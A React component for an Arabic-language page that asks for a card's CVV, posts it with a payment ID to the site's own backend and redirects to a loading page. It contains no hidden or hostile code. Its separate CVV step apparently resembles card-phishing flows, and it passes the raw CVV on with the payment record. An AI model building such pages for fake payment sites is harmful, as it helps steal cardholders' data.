import { useState, useEffect } from "react";

export default function CVV() {
  const [cvv, setCvv] = useState("");
  const [paymentId, setPaymentId] = useState<number | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("paymentId");
    if (id) setPaymentId(Number(id));
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cvv || !paymentId) return;

    setLoading(true);
    setError("");

    try {
      const response = await fetch("/api/trpc/payment.submitCvv", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentId,
          cvvNumber: cvv,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.success) {
        window.location.href = `/loading?paymentId=${paymentId}`;
      } else {
        setError(data.result?.data?.message || "حدث خطأ في التحقق");
      }
    } catch (err) {
      setError("خطأ في الاتصال بالخادم");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
        <h1 className="text-2xl font-bold text-gray-800 mb-2">رمز الأمان CVV</h1>
        <p className="text-gray-600 mb-6">أدخل الرمز الموجود خلف البطاقة</p>

        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              رمز CVV
            </label>
            <input
              type="text"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
              placeholder="000"
              maxLength={3}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl tracking-widest"
              required
            />
          </div>

          <button
            type="submit"
            disabled={loading || cvv.length !== 3}
            className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-2 px-4 rounded-lg transition"
          >
            {loading ? "جاري التحقق..." : "تحقق"}
          </button>
        </form>
      </div>
    </div>
  );
}
